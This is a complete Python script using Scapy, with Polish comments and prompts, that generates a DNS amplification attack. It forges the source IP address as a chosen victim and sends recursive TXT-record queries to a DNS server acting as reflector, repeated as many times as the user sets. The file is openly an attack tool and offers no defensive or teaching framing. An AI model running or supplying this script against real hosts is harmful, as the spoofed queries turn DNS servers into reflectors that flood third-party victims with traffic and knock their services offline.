#!/usr/bin/env python3

from scapy.all import IP, UDP, DNS, DNSQR, send
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="Generator zapytań DNS Amplification z IP Spoofingiem")
    parser.add_argument("--victim", required=True, help="Adres IP ofiary (fałszywy adres źródłowy - Source IP)")
    parser.add_argument("--dns", required=True, help="Adres IP serwera DNS / reflektora (Destination IP)")
    parser.add_argument("--domain", default="example.com", help="Domena zapytania DNS (celowo wyzwalająca dużą odpowiedź)")
    parser.add_argument("--count", type=int, default=10, help="Liczba pakietów do wysłania")
    
    args = parser.parse_args()

    victim_ip = args.victim
    dns_ip = args.dns
    domain = args.domain
    count = args.count

    print(f"[*] Przygotowanie ataku DNS Amplification:")
    print(f"    - Podstawiony IP (Ofiara): {victim_ip}")
    print(f"    - Docelowy Serwer DNS (Reflektor): {dns_ip}")
    print(f"    - Zapytanie: Rekord TXT dla domeny '{domain}'")
    print(f"    - Liczba pakietów: {count}")

    # Konstrukcja sfałszowanego pakietu sieciowego za pomocą Scapy:
    # 1. Warstwa IP: Podmieniamy adres źródłowy na IP ofiary
    # 2. Warstwa UDP: Ustawiamy port docelowy na 53 (standardowy DNS)
    # 3. Warstwa DNS: Tworzymy zapytanie rekurencyjne (rd=1) o rekord typu TXT
    packet = IP(src=victim_ip, dst=dns_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))

    try:
        print(f"[*] Rozpoczynam wysyłanie pakietów...")
        # send() wysyła pakiety na poziomie warstwy 3 (IP), verb=0 wycisza zbędne komunikaty Scapy
        send(packet, count=count, verbose=False)
        print(f"[+] Pomyślnie wysłano {count} sfałszowanych pakietów do serwera DNS!")
    except Exception as e:
        print(f"[-] Wystąpił błąd podczas wysyłania pakietów: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()